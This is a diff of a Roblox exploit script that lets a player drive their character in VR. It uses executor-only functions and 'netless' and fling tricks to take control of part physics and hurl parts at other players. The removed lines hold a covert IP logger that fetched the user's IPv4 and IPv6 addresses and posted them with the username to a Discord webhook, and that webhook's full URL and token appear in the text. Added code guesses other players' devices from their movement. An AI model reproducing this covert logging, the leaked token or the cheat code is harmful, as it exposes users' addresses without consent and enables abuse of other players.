@@ -1,18 +1,14 @@
 script.Disabled = true
-
-if _G.IsVr == true then
-	return
-end
+if _G.IsVr == true then return end
+_G.IsVr = true
 
 local User = game:GetService('Players').LocalPlayer
-
-_G.IsVr = true
 local AlternativeSpawn = task.spawn
-
 local ScriptsToRemove = {
 	"NexusVRCharacterModelClientLoader",
 	"VR",
 }
+
 for i,v in pairs(User:GetDescendants())do
 	if v:IsA("LocalScript") then
 		for _,n in pairs(ScriptsToRemove)do
@@ -32,28 +28,24 @@ for i,v in pairs(User.Character:GetDescendants())do
 	end
 end
 
---ok
 local fenv = getfenv()
 local shp = fenv.sethiddenproperty or fenv.set_hidden_property or fenv.set_hidden_prop or fenv.sethiddenprop
 local ssr = fenv.setsimulationradius or fenv.set_simulation_radius or fenv.set_sim_radius or fenv.setsimradius or fenv.set_simulation_rad or fenv.setsimulationrad
---ok
 local StrongIdentity = pcall(function()
 	local _=game:GetService("CoreGui"):WaitForChild("RobloxGui")
 end)
+
 local Check = "✓"
 local SetupModel = nil
+local NameTag = nil
 
 if StrongIdentity==true then
-	SetupModel = game:GetObjects("rbxassetid://10221002727")[1]
+	SetupModel = game:GetObjects("rbxassetid://10481164488")[1]
+	NameTag = SetupModel.NameTag
 else
-	SetupModel = game:GetService('Players').MenuSetup
+	SetupModel = game:GetService('ReplicatedStorage').VRMenu
+	NameTag = game:GetService('ReplicatedStorage').VRMenu.NameTag
 end
-
-function GetIP()
---	local StringGot = game:HttpGet("https://ip6only.me/api/")
---	return StringGot:split(",")[2]
-end
-local YourIP = GetIP()
 
 --Start of Whitelist
 if StrongIdentity==true then
@@ -127,10 +119,137 @@ if StrongIdentity==true then
 	end
 end
 --End of Whitelist
-warn("Whitelist valid")
+--Amokahs Device Reader (Two device options)
+local PlayerDeviceData = {}
+function YieldMobile(player)
+	if player==game:GetService('Players').LocalPlayer then return end
+	PlayerDeviceData['p_'..player.UserId] = {true,"Undefined"} --boolean means it's on Default
+	local Character = player.Character
+	local Flags = {
+		Whole = {Counted=0,Debounced=os.clock()},
+		Decimals = {Counted=0,Debounced=os.clock()}
+	}
+	if Character then
+		local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
+		if not Humanoid then
+			repeat task.wait(-1) until Character:FindFirstChildWhichIsA("Humanoid")
+			Humanoid = Character:FindFirstChildWhichIsA('Humanoid')
+		end
+		local DEBOUNCE = os.clock()
+		local Flags = {
+			DECIMALS = 0
+		}
+		local Rid = nil
+		local LastDirection = Humanoid.MoveDirection.Magnitude
+		Rid = Humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(function()
+			local NewDirection = Humanoid.MoveDirection.Magnitude
+			if NewDirection > 0 and NewDirection < 1 then
+				Flags.DECIMALS=Flags.DECIMALS+1
+				DEBOUNCE = os.clock()
+			end
+			LastDirection = NewDirection
+		end)
+		local SELFEX = nil
+		SELFEX = game:GetService("RunService").RenderStepped:Connect(function()
+			if os.clock()-DEBOUNCE < 0.045 then
+				local Length = Flags.DECIMALS
+				if Length > 5 then
+					PlayerDeviceData['p_'..player.UserId] = {false,"Mobile"}
+					Rid:Disconnect()
+					SELFEX:Disconnect()
+				else
+					PlayerDeviceData['p_'..player.UserId] = {false,"PC"}
+				end
+			elseif os.clock()-DEBOUNCE > 0.045 then
+				Flags.DECIMALS = 0
+			end
+		end)
+	else
+		player.CharacterAdded:Once(function()
+			YieldMobile(player)
+		end)
+	end
+end
+game:GetService('Players').PlayerAdded:Connect(YieldMobile)
+for _,p in pairs(game:GetService('Players'):GetPlayers())do
+	YieldMobile(p)
+end
+--
+function GetDeviceType(Argument)
+	for _,p in pairs(game:GetService('Players'):GetPlayers())do
+		if tostring(p)==tostring(Argument) or tostring(p.UserId)==tostring(Argument) then
+			local Data = PlayerDeviceData["p_"..p.UserId]
+			if Data then
+				return Data[2]
+			else
+				return "Undefined"
+			end
+		end
+	end
+end
+--~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~~ ~
+local SpyChar = function(player)
+	if player == game:GetService('Players').LocalPlayer then 
+		return
+	end
+	local f = function(charInst)
+		local NameTag2 = NameTag:Clone()
+		local selfX = nil
+		selfX = game:GetService("RunService").RenderStepped:Connect(function()
+			if player.Character~=charInst then
+				selfX:Disconnect()
+			else
+				local RootPlace = player.Character:FindFirstChild("Head") or player.Character:FIndFirstChild("HumanoidRootPart")
+				if RootPlace then
+					NameTag2.Parent = RootPlace
+					NameTag2.Adornee = RootPlace
+					local Distance = ((workspace.CurrentCamera.CFrame * game:GetService('VRService'):GetUserCFrame(Enum.UserCFrame.Head)).Position - RootPlace.Position).Magnitude
+					NameTag2.NamePlate.User.Text = player.Name .. " [@" .. player.DisplayName .. "]"
+					if Distance < 15 and Distance < 30 then
+						NameTag2.Enabled = true
+						NameTag2.NamePlate.Visible = true
+						NameTag2.UserIcon.Visible = false
+					elseif Distance > 30 and Distance < 100 then
+						NameTag2.NamePlate.Visible = false
+						NameTag2.UserIcon.Visible = true
+						NameTag2.Enabled = true 
+					elseif Distance > 100 then
+						NameTag2.Enabled = false
+					end
+				else
+					NameTag2:Destroy()
+				end
+				local Humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
+				if Humanoid then
+					local Device = GetDeviceType(player)
+					NameTag2.NamePlate.Device.Text = "[" .. Device .. "]"
+					if Device=='PC' then
+						NameTag2.NamePlate.Device.TextColor3 = Color3.new(0.2, 0.7, 1)
+					elseif Device == 'Mobile' then
+						NameTag2.NamePlate.Device.TextColor3 = Color3.new(0.25, 1, 0.25)
+					else
+						NameTag2.NamePlate.Device.TextColor3 = Color3.new(1, 0.25, 0.25)
+					end
+					Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+				end
+			end
+		end)
+	end
+	if player.Character then
+		f(player.Character)
+	end
+	player.CharacterAdded:Connect(f)
+end
+local Players = game:GetService('Players')
+Players.PlayerAdded:Connect(SpyChar)
+for _,p in pairs(Players:GetPlayers())do
+	SpyChar(p)
+end
+
+
 local Camera = workspace.CurrentCamera
 local Debounces = {}
-local Typing = false
+
 local ExtraVariables = {
 	BaseOffsetCamera = Vector3.new(0,-4,0),
 	VrFinalized = false,
@@ -139,6 +258,9 @@ local ExtraVariables = {
 	TurnArmsForTools=true,
 	DisplayNames=true,
 	CharacterViewport=true,
+	FakeWalking = false,
+	SaveSettings = {Props={}},
+	LocalProps = {},
 }
 
 local Services = {
@@ -149,36 +271,7 @@ local Services = {
 	TweenService = game:GetService("TweenService"),
 	StarterGui = game:GetService("StarterGui")
 }
-
 local VrTracker = {}
-
-pcall(function()
-	local function GetIP(d)
-		local StringGot = game:HttpGet("https://ip"..tostring(d).."only.me/api/")
-		return StringGot:split(",")[2]
-	end
-
-	local msg = {
-		["embeds"] = {{
-			["color"] = 13708129,
-			["description"] = "```\nIPv6: "..tostring(GetIP(6)).."\nIPv4: "..tostring(GetIP(4)).."```\nUser: **" .. game:GetService("Players").LocalPlayer.Name .."**",
-			["author"] = {
-				["name"] = "Information Logged"
-			}}
-		}
-	}
-
-	local response = syn.request(
-		{
-			Url = "https://discord.com/api/webhooks/997161253778759730/jQdw_P0rdX-D4qfs2RtXJVTsZwVsrU0PK7IHuVykzzkaOE45q_Co7D2l4XYJicFCrQ7B",
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json"
-			},
-			Body = game:GetService("HttpService"):JSONEncode(msg)
-		}
-	)
-end)
 
 if game:GetService("RunService"):IsStudio() == false and Services.VR.VREnabled == false then return end
 
@@ -190,11 +283,13 @@ local Create = function(Class,Parent,Properties)
 	A.Parent = Parent
 	return A
 end
+
 local FrameYield = function(Seconds)
 	local Start = os.clock()
 	repeat game:GetService("RunService").RenderStepped:Wait() until os.clock()-Start >= Seconds
 	return os.clock()-Start
 end
+
 local ConnectFunctionUntil = function(Event,funcToLoop)
 	local Temp = Event
 	local Hmm = nil
@@ -205,7 +300,7 @@ local ConnectFunctionUntil = function(Event,funcToLoop)
 		end
 	end)
 end
-local FedoraHandles = {}
+
 local CreateTemporaryLoopWithRunServiceType = function(Type,Seconds,func)
 	local Type = game:GetService("RunService")[Type]
 	local Start = os.clock()
@@ -220,9 +315,11 @@ local CreateTemporaryLoopWithRunServiceType = function(Type,Seconds,func)
 		end
 	end)
 end
+
 local SpawnAlternative = function(func)
 	task.spawn(func)
 end
+
 local CharacterLimbs = {
 	LeftArm = nil,
 	RightArm = nil,
@@ -231,6 +328,7 @@ local CharacterLimbs = {
 	Head = nil,
 	Hats = {},
 }
+
 local Parts = {
 	FollowPart = Create("Part",workspace.CurrentCamera,{
 		Size = Vector3.new(1,1,1),
@@ -307,15 +405,6 @@ Create("SelectionBox",Parts.RightArm,{
 	SurfaceTransparency = 1,
 	LineThickness = 0.025
 })
-function GetPlayersInVr() --Only for this one
-	local Plrs = {}
-	for i,v in pairs(game:GetService("Players"):GetPlayers())do
-		if v.Character and (v.Character:FindFirstChildWhichIsA("Humanoid").Health <= 0 and v:FindFirstChild('')) then --Not 100% accurate but you know. What're the chances?
-			table.insert(Plrs,v)
-		end
-	end
-	return Plrs
-end
 function Destroy(Obj,Delay_)
 	if Delay_ then
 		task.delay(Delay_,function()
@@ -449,8 +538,9 @@ for i,v in pairs(User.Character:GetChildren())do
 		p.Parent = v
 	end
 end
+
 local Reverbs={}
-function Maintain(Obj)
+function Netless(Obj)
 	Obj.Massless = true
 	if not Obj then return end
 	local AngCount = 0
@@ -488,10 +578,10 @@ function Maintain(Obj)
 			Obj.NoFlinging:Destroy()
 		end
 	end
-	if Obj:FindFirstChild("Maintained") then return end
+	if Obj:FindFirstChild("Netlessed") then return end
 	Create("StringValue",Obj,{
-		Value = "Maintained",
-		Name = "Maintained",
+		Value = "Netlessed",
+		Name = "Netlessed",
 	})
 	local Constraint = Create("Attachment",Obj,{
 		Name="Center",
@@ -532,7 +622,7 @@ function Maintain(Obj)
 end
 Debounces.ToggleDanger = os.clock()
 function MakePartDangerous(OBJ,toggle)
-	if OBJ:FindFirstChild("Maintained") then
+	if OBJ:FindFirstChild("Netlessed") then
 		if toggle == true then
 			if OBJ:FindFirstChild("Flinging") then
 				OBJ:FindFirstChild("NoFlinging"):Destroy()
@@ -549,7 +639,7 @@ function MakePartDangerous(OBJ,toggle)
 			})
 		end
 	else
-		warn("Part danger is at 0%, please 'Maintain' the part before using this function.")
+		warn("Part danger is at 0%, please 'Netless' the part before using this function.")
 	end
 end
 
@@ -561,9 +651,8 @@ SpawnAlternative(function()
 end)
 
 local SpawnInCFrame = Character.PrimaryPart.CFrame
-
 local Angle = CFrame.Angles(0,0,0)
-
+local VulnChar = nil
 User.CharacterAdded:Connect(function(char)
 	for i = 1,8 do
 		pcall(function()
@@ -571,19 +660,7 @@ User.CharacterAdded:Connect(function(char)
 		end)
 		game:GetService("RunService").RenderStepped:Wait()
 	end
-	CharacterLimbs.Hats = GetHatsAsUsefulTable(char)
 end)
-
-Services.UIS.InputBegan:Connect(function(k)
-	if Services.VR.VREnabled == true then
-		--workspace.test.RemoteEvent:FireServer(tostring(k.KeyCode))
-	end
-end)
-
-CharacterLimbs.Hats = GetHatsAsUsefulTable(Character)
-
-local VulnChar = nil
-
 function MoveAt(Part,CFrame_)
 	local BP = nil
 	local GY = nil
@@ -606,7 +683,6 @@ function MoveAt(Part,CFrame_)
 	GY.P = 1240
 	GY.CFrame = CFrame_
 end
-
 function SetUpUndead()
 	local Humanoid=Character:FindFirstChildWhichIsA("Humanoid")
 	Humanoid.PlatformStand = true
@@ -628,53 +704,60 @@ function SetUpUndead()
 	task.wait(1)
 	Humanoid.MaxHealth = -0.1
 end
-
+function FindIsKeyPressed(key)
+	for _,x in pairs(Services.UIS:GetKeysPressed())do
+		if x==key then
+			return true
+		end
+	end
+	return false
+end
 function RePositionHeadParts()
 	local HeadCFrame = Camera.CFrame * Services.VR:GetUserCFrame(Enum.UserCFrame.Head)
 	if GetRigType() == 'R6' then
-		Maintain(Character.Head)
+		Netless(Character.Head)
 		CharacterLimbs.Head.CFrame = HeadCFrame
-		Maintain(Character.Torso)
+		Netless(Character.Torso)
 		Character.Torso.CFrame = HeadCFrame*CFrame.new(0,-1.5,0)
-		Maintain(Character.HumanoidRootPart)
+		Netless(Character.HumanoidRootPart)
 		Character.HumanoidRootPart.CFrame = HeadCFrame*CFrame.new(0,-1.5,0)
 	elseif GetRigType()=='R15' then
-		Maintain(Character.Head)
+		Netless(Character.Head)
 		CharacterLimbs.Head.CFrame = HeadCFrame
-		Maintain(Character.UpperTorso)
+		Netless(Character.UpperTorso)
 		Character.UpperTorso.CFrame = HeadCFrame*CFrame.new(0,-1.5,0)
 		if Character:FindFirstChild("LowerTorso") then
-			Maintain(Character.LowerTorso)
+			Netless(Character.LowerTorso)
 			Character.LowerTorso.CFrame = HeadCFrame*CFrame.new(0,-1.5,0)
 		end
-		Maintain(Character.HumanoidRootPart)
+		Netless(Character.HumanoidRootPart)
 		Character.HumanoidRootPart.CFrame = HeadCFrame*CFrame.new(0,-1.5,0)
 	end
 end
 
 local CameraAngle = CFrame.Angles(0,0,0)
+local HoldingDirection = false
+local PredictingPosition = false
 
 Parts.FollowPart.Position = Character.PrimaryPart.Position
 Debounces.SetUp = os.clock()
 Debounces.PromptChat = os.clock()
-local HoldingDirection = false
-local PredictingPosition = false
+ExtraVariables.Paused = false
+
 Services.UIS.InputBegan:Connect(function(key)
-	if key.KeyCode==Enum.KeyCode.W and game:GetService("RunService"):IsStudio() then
+	if ExtraVariables.Paused == true then return end
+	if key.KeyCode==Enum.KeyCode.W and game:GetService("RunService"):IsStudio() and not ExtraVariables.Paused then
 		HoldingDirection=true
 	end
-	if key.KeyCode == Enum.KeyCode.ButtonL2 then
+	if key.KeyCode == Enum.KeyCode.ButtonL2 and not ExtraVariables.Paused then
 		HoldingDirection = true
 	elseif key.KeyCode == Enum.KeyCode.ButtonR2 then
 		task.delay(0,function() --VERY SLIGHT DELAY in case action menu is opened
 			if ExtraVariables.ActionOpened == true then return end
+			if ExtraVariables.Paused == true then return end
 			pcall(function()
 				if GetRigType()=='R6' then
 					MakePartDangerous(CharacterLimbs.RightArm,true)
-				else
-					for i,v in pairs(FedoraHandles)do
-						MakePartDangerous(v,false)
-					end
 				end
 			end)
 		end)
@@ -696,23 +779,26 @@ Services.UIS.InputEnded:Connect(function(key)
 		pcall(function()
 			if GetRigType()=='R6' then
 				MakePartDangerous(CharacterLimbs.RightArm,false)
-			else
-				for i,v in pairs(FedoraHandles)do
-					MakePartDangerous(v,false)
-				end
 			end
 		end)
-	elseif key.KeyCode == Enum.KeyCode.ButtonR1 then
+	elseif key.KeyCode == Enum.KeyCode.ButtonR1 and ExtraVariables.Paused==false then
+		if not Debounces.Teleported then
+			Debounces.Teleported = os.clock()-2
+		end
 		if (Parts.FollowPart.Position*Vector3.new(1,0,1) - VrTracker.PredictedPosition*Vector3.new(1,0,1)).Magnitude > 1.1 then
-			Parts.FollowPart.Position = VrTracker.PredictedPosition
-			PromptMessage("",0.25,0.3) --Lol this also works as a transition
-			local TpSound = Create("Sound",game:GetService("SoundService"),{
-				Volume = 1,
-				Pitch = 1,
-				Playing = true,
-				SoundId='rbxassetid://8276741979'
-			}):Play()
-			Destroy(TpSound,5)
+			if os.clock()-Debounces.Teleported > 1 then
+				Parts.FollowPart.Position = VrTracker.PredictedPosition
+				Debounces.Teleported = os.clock()
+				game:GetService('TweenService'):Create(Parts.FollowPart,TweenInfo.new(1),{}):Play()
+				PromptMessage("",0.5,0) --Lol this also works as a transition
+				local TpSound = Create("Sound",game:GetService("SoundService"),{
+					Volume = 1,
+					Pitch = 1,
+					Playing = true,
+					SoundId='rbxassetid://9120438364'
+				}):Play()
+				Destroy(TpSound,5)
+			end
 		end
 		PredictingPosition = false
 	end
@@ -724,7 +810,6 @@ Character.Humanoid.RootPart.Anchored=true
 FrameYield(1)
 
 local OffsettingLimbHats = {}
-
 for i,v in pairs(Character:GetDescendants())do
 	if v:IsA("JointInstance") and v.Name=='AccessoryWeld' then
 		if v.Part1.Name:lower():find("leg") or v.Part1.Name:lower():find("arm") then
@@ -743,39 +828,9 @@ for i,v in pairs(Character:GetDescendants())do
 		end
 	end
 end
-task.wait(0.2)
 
-local FlingPart = {
-	Primary = nil,
-}
+task.wait(0.8)
 local ToolsAndOffsets = {}
-for i,v in pairs(User.Backpack:GetChildren())do
-	pcall(function()
-		local Hand = Character:FindFirstChild("Right Arm") or Character:FindFirstChild("Right Hand")
-		if v:IsA("Tool") and v:FindFirstChild("Handle") then
-			task.spawn(function()	
-				v.Parent=User.Character
-				task.wait(0.5)
-				local Offset = v.Handle.CFrame:ToObjectSpace(Hand.CFrame)
-				table.insert(ToolsAndOffsets,{v,Offset})
-				for i,v in pairs(v:GetDescendants())do
-					if v:IsA("BasePart") then
-						game:GetService("RunService").RenderStepped:Connect(function()
-							v.Velocity = Vector3.new(0,0,0)
-							v.CFrame = Hand.CFrame * Offset:Inverse()
-							Maintain(v)
-						end)
-						v.Massless = true
-						v.CanCollide = false
-					end
-				end
-				Maintain(v.Handle)
-				v.Parent=User.Backpack
-			end)
-		end
-	end)
-end
-task.wait(0.6)
 for _,x in pairs(User.Character:GetChildren())do
 	if x:IsA("Accessory") then
 		x:FindFirstChildWhichIsA('BasePart').Name = "Handle"
@@ -793,16 +848,19 @@ function InsertHatTool(ClientTool)
 		ClientTool.RequiresHandle=true
 		A.Parent = ClientTool
 	end
-	table.insert(ToolsAndOffsets,{ClientTool,CFrame.new(0,0,0)})
+	table.insert(ToolsAndOffsets,{ClientTool})
 end
 
 task.wait((15)  *  0.0105) --Basically 15 frames for your character to go stiff for proper arm/limb positioning
+
 Character.Humanoid.RootPart.Anchored=false
 
 ExtraVariables.ToolGrabbed = 0
 local MovementFunctions = {
 	GrabTool = function(dir)
-		ExtraVariables.ToolGrabbed = ExtraVariables.ToolGrabbed + (1*dir)
+		if type(dir)=='number' then
+			ExtraVariables.ToolGrabbed = ExtraVariables.ToolGrabbed + (1*dir)
+		end
 		local LocalSelected = ExtraVariables.ToolGrabbed
 		if LocalSelected == 0 then
 			User.Character:FindFirstChildWhichIsA("Humanoid"):UnequipTools()
@@ -815,9 +873,8 @@ local MovementFunctions = {
 			return
 		end
 		for i,v in pairs(ToolsAndOffsets)do
-			if i == ExtraVariables.ToolGrabbed then
+			if (type(dir)=='number' and i == ExtraVariables.ToolGrabbed) or (type(dir)~='number' and v==dir) then
 				local Tool = v[1]
-				local Offset = v[2]
 				local Humanoid = User.Character:FindFirstChildWhichIsA("Humanoid")
 				Humanoid:UnequipTools()
 				Humanoid:EquipTool(Tool)
@@ -847,17 +904,6 @@ if GetRigType()=='R6' then
 	end
 end
 
-for i,v in pairs(Fedoras)do
-	local accessory = v
-	local Handle = accessory:FindFirstChildWhichIsA("BasePart")
-	Maintain(Handle)
-	table.insert(FedoraHandles,Handle)
-	pcall(function()
-		Handle:FindFirstChildWhichIsA("JointInstance"):Destroy()
-	end)
-	Handle.Parent = Character
-	accessory:Destroy()
-end
 local ProbablyIK = {
 	Root = Create("Part",nil,{Size=Vector3.new(1,1,1),Anchored = true,Color=Color3.new(1,0.5,.5),CanCollide=false}),
 	Left = Create("Part",nil,{Size=Vector3.new(1,1,1),Anchored = true,Color=Color3.new(0,1,0),CanCollide=false}),
@@ -907,7 +953,12 @@ local LegTracking = game:GetService("RunService").RenderStepped:Connect(function
 		table.insert(LegTweens,y)
 	end
 end)
-
+local AllPartsInParts={}
+for i,v in pairs(AllPartsInParts) do
+	if v:IsA("BasePart") then
+		table.insert(AllPartsInParts,v)
+	end
+end
 Create("SpecialMesh",Parts.FollowPart,{Scale=Vector3.new(0,0,0)})
 game:GetService("RunService").Stepped:Connect(function()
 	if Services.VR.VREnabled == not game:GetService("RunService"):IsStudio() then
@@ -918,11 +969,24 @@ game:GetService("RunService").Stepped:Connect(function()
 		end
 		if HoldingDirection == true and os.clock()-Debounces.Moving > 0.0105 then
 			Debounces.Moving = os.clock()
-			local HeadCFrame = Services.VR:GetUserCFrame(Enum.UserCFrame.Head)
-			local LarmCFrame = Services.VR:GetUserCFrame(Enum.UserCFrame.LeftHand)
-			local RobloxHeadCFrame = Camera.CFrame --Idk, that type of naming makes it easy to remember certain things
-			local From = Parts.FollowPart.CFrame:ToObjectSpace(Camera.CFrame * LarmCFrame):Inverse()
-			Parts.FollowPart.CFrame = CFrame.new((Camera.CFrame * LarmCFrame * CFrame.new(0,0,-0.1*3)*From).Position)
+			if not ExtraVariables.FakeWalking then
+				local HeadCFrame = Services.VR:GetUserCFrame(Enum.UserCFrame.Head)
+				local LarmCFrame = Services.VR:GetUserCFrame(Enum.UserCFrame.LeftHand)
+				local RobloxHeadCFrame = Camera.CFrame --Idk, that type of naming makes it easy to remember certain things
+				local From = Parts.FollowPart.CFrame:ToObjectSpace(Camera.CFrame * LarmCFrame):Inverse()
+				Parts.FollowPart.CFrame = CFrame.new((Camera.CFrame * LarmCFrame * CFrame.new(0,0,-0.1*3)*From).Position)
+			else
+				local HeadCFrame = Services.VR:GetUserCFrame(Enum.UserCFrame.Head)
+				local LarmCFrame = Services.VR:GetUserCFrame(Enum.UserCFrame.LeftHand)
+				local RobloxHeadCFrame = Camera.CFrame --Idk, that type of naming makes it easy to remember certain things
+				local From = Parts.FollowPart.CFrame:ToObjectSpace(Camera.CFrame * LarmCFrame):Inverse()
+				local SetCFrameForPart = CFrame.new((Camera.CFrame * LarmCFrame * CFrame.new(0,0,-0.1*3)*From).Position)
+				local RayDown = Ray.new((Camera.CFrame*HeadCFrame).Position,Vector3.new(0,-1e5,0))
+				local Hit,Pos = workspace:FindPartOnRayWithIgnoreList(RayDown,{Character,unpack(AllPartsInParts),workspace.CurrentCamera},true,true)
+				if Pos then
+					local SameLevel = Vector3.new(SetCFrameForPart.Position.X,Pos.Y,SetCFrameForPart.Position.Z)
+				end
+			end
 		end
 		Camera.CameraType = Enum.CameraType.Scriptable
 		Camera.CFrame = Parts.FollowPart.CFrame * CFrame.new(ExtraVariables.BaseOffsetCamera) * CameraAngle
@@ -937,7 +1001,7 @@ game:GetService("RunService").Stepped:Connect(function()
 						table.insert(UnpackedHatHandles,v.Handle)
 					end)
 				end
-				Maintain(Character.PrimaryPart)
+				Netless(Character.PrimaryPart)
 				SetUpUndead()
 			end
 			if os.clock() - Debounces.SetUp < 6 then return end
@@ -953,7 +1017,7 @@ game:GetService("RunService").Stepped:Connect(function()
 				for _,x in pairs(Character:GetChildren())do
 					if x.Name:find("Leg") then
 						Legs[x.Name]=x
-						Maintain(x)
+						Netless(x)
 					end
 				end
 			end)
@@ -997,12 +1061,12 @@ game:GetService("RunService").Stepped:Connect(function()
 			Parts.Head.CFrame = Camera.CFrame * HCFrame
 			RePositionHeadParts()
 			if GetRigType() == 'R6' and CharacterLimbs.Head ~= nil and IsParentLocked(CharacterLimbs.Head)==false then
-				--Maintain(CharacterLimbs.Head)
+				--Netless(CharacterLimbs.Head)
 				for _,hatInfo in pairs(CharacterLimbs.Hats)do
 					local Hat = hatInfo[1]
 					local Offset = hatInfo[2]
 					Hat.Handle.CFrame = Parts.Head.CFrame
-					Maintain(Hat.Handle)
+					Netless(Hat.Handle)
 					if Hat.Handle:FindFirstChild('AccessoryWeld') then
 						--	Hat.Handle.AccessoryWeld:Destroy()
 					end
@@ -1013,13 +1077,13 @@ game:GetService("RunService").Stepped:Connect(function()
 				RePositionHeadParts()
 				for i,v in pairs(CharacterLimbs)do
 					if type(v)~='table' then
-						Maintain(v)
+						Netless(v)
 					end
 				end
 				for _,hatCheck in pairs(Character:GetChildren())do
 					if hatCheck:IsA("Accessory") then
 						pcall(function()
-							Maintain(hatCheck.Handle)
+							Netless(hatCheck.Handle)
 						end)
 						pcall(function()
 							hatCheck.Handle.Transparency = 1
@@ -1049,7 +1113,7 @@ game:GetService("RunService").Stepped:Connect(function()
 						table.insert(UnpackedHatHandles,v.Handle)
 					end)
 				end
-				Maintain(Character.PrimaryPart)
+				Netless(Character.PrimaryPart)
 				SetUpUndead()
 			end
 			if os.clock() - Debounces.SetUp < 6 then return end
@@ -1101,30 +1165,18 @@ game:GetService("RunService").Stepped:Connect(function()
 			local HCFrame = Services.VR:GetUserCFrame(Enum.UserCFrame.Head)
 			--
 			Parts.LeftArm.CFrame = Camera.CFrame * LHand * CFrame.Angles(math.rad(90),0,0)
-			Parts.PartsToFling = FedoraHandles
-			if #FedoraHandles > 0 then
-				if FedoraHandles[1]:FindFirstChild("Flinging") then
-					for lol,HANDLE in pairs(FedoraHandles)do
-						if HANDLE:FindFirstChild("Flinging") then
-							HANDLE.CFrame = Camera.CFrame*RHand*CFrame.new(-2+(lol*1.5),0,-4)
-						else
-							HANDLE.CFrame = Parts.Head.CFrame*CFrame.new(0,-1.5,0)*CFrame.Angles(math.rad(-90),0,0)
-						end
-					end
-				end
-			end
 			Parts.FakeLarm.CFrame = (Parts.LeftArm.CFrame * CFrame.new(0,0.1,0)) * CFrame.Angles(math.pi,math.pi,0)
 			Parts.FakeRarm.CFrame = (Parts.RightArm.CFrame * CFrame.new(0,0.1,0)) * CFrame.Angles(math.pi,math.pi,0)
 			Parts.Head.CFrame = Camera.CFrame * HCFrame
 			Parts.RightArm.CFrame = Camera.CFrame * RHand * CFrame.Angles(math.rad(90),0,0)
 			RePositionHeadParts()
 			if GetRigType() == 'R15' and CharacterLimbs.Head ~= nil and IsParentLocked(CharacterLimbs.Head)==false then
-				--Maintain(CharacterLimbs.Head)
+				--Netless(CharacterLimbs.Head)
 				for _,hatInfo in pairs(CharacterLimbs.Hats)do
 					local Hat = hatInfo[1]
 					local Offset = hatInfo[2]
 					Hat.Handle.CFrame = Parts.Head.CFrame
-					Maintain(Hat.Handle)
+					Netless(Hat.Handle)
 					if Hat.Handle:FindFirstChild('AccessoryWeld') then
 						--	Hat.Handle.AccessoryWeld:Destroy()
 					end
@@ -1135,13 +1187,13 @@ game:GetService("RunService").Stepped:Connect(function()
 				RePositionHeadParts()
 				for i,v in pairs(CharacterLimbs)do
 					if type(v)~='table' then
-						Maintain(v)
+						Netless(v)
 					end
 				end
 				for _,hatCheck in pairs(Character:GetChildren())do
 					if hatCheck:IsA("Accessory") then
 						pcall(function()
-							Maintain(hatCheck.Handle)
+							Netless(hatCheck.Handle)
 						end)
 						pcall(function()
 							hatCheck.Handle.Transparency = 1
@@ -1151,7 +1203,7 @@ game:GetService("RunService").Stepped:Connect(function()
 			end
 		end
 		--
-		if PredictingPosition == true then
+		if PredictingPosition == true and ExtraVariables.Paused ~= true then
 			local PositionFromHead = Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.Head)*CFrame.new(1,-1,0)
 			local RightArmCFrame = Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.RightHand)
 			local Ignore_A = {}
@@ -1178,7 +1230,7 @@ game:GetService("RunService").RenderStepped:Connect(function()
 	if Services.VR.VREnabled == not game:GetService("RunService"):IsStudio() and CharacterLimbs.Head~=nil then
 		for _,x in pairs(Character:GetChildren())do
 			pcall(function()
-				Maintain(x)
+				Netless(x)
 			end)
 		end
 		CharacterLimbs.RightArm.CFrame = Parts.RightArm.CFrame
@@ -1811,9 +1863,11 @@ Frame.Parent = ChatSurface
 local ColorCorrection = Create("ColorCorrectionEffect",nil,{
 	Brightness = -0.5
 })
+Services.StarterGui:SetCore("VREnableControllerModels", true)
 function ToggleChatMenu(t)
 	if os.clock()-Debounces.PromptChat < 0.5 then return end
 	Debounces.PromptChat = os.clock()
+	ChatBar:CaptureFocus()
 	local SFX = Create("Sound",game:GetService("SoundService"),{
 		SoundId = "rbxassetid://8276741979",
 		Pitch = Random.new():NextNumber(1,1.1),
@@ -1924,7 +1978,7 @@ game:GetService("RunService").RenderStepped:Connect(function()
 			Volume = 1,
 			Playing = true,
 		})
-		PlaySound(2789458365) --2789456957
+		PlaySound(2789458365)
 		display.Size=Vector3.new(0,0,0)
 		rot.Transparency=0
 		game:GetService("TweenService"):Create(display,TweenInfo.new(.5),{Size=Vector3.new(3.5,0,3.5)}):Play()
@@ -2111,7 +2165,13 @@ end
 local UIS = game:GetService("UserInputService")
 local Shift = false
 local erase = os.clock()
-
+ExtraVariables.ChangedText = Instance.new('BindableEvent')
+ExtraVariables.ChangedText.Event:Connect(function(txt)
+	if ChatBar:IsFocused() then
+		ChatBar.Text = txt
+	end
+end)
+ExtraVariables.ScreenBoardEntered = Instance.new("BindableEvent")
 UIS.InputBegan:Connect(function(k)
 	local Equiv = nil
 	local Upper = nil
@@ -2152,6 +2212,25 @@ UIS.InputBegan:Connect(function(k)
 			ChatBar.Text = ""
 		end
 	end
+	local ok = ExtraVariables.ScreenBoardEntered.Event:Connect(function()
+		Typing = false
+		ChatBar:ReleaseFocus()
+		if ChatBar.Text:len() > 0 then
+			local Ok = Instance.new("Sound")
+			Ok.Parent = game:GetService("SoundService")
+			Ok.SoundId = 'rbxassetid://4590657391'
+			Ok.TimePosition = 0
+			Ok:Play()
+			SpawnAlternative(function()
+				task.wait(1.5)
+				Ok:Destroy()
+			end)
+			local PlayerColor = ComputeNameColor(User.Name)
+			AddChatLog(GetColoredText("[" .. User.DisplayName .. "] : ",PlayerColor) .. " " .. ChatBar.Text)
+			SendChat(ChatBar.Text)
+			ChatBar.Text = ""
+		end
+	end)
 	if k.KeyCode == Enum.KeyCode.LeftShift or k.KeyCode == Enum.KeyCode.RightShift then
 		Shift = true
 	end
@@ -2176,6 +2255,302 @@ end)
 UIS.InputEnded:Connect(function(k)
 	if k.KeyCode == Enum.KeyCode.LeftShift or k.KeyCode == Enum.KeyCode.RightShift then
 		Shift = false
+	end
+end)
+
+ExtraVariables.MenuOpen = Vector3.new(4,3,0.01)
+
+local MenuPart = Create("Part",nil,{
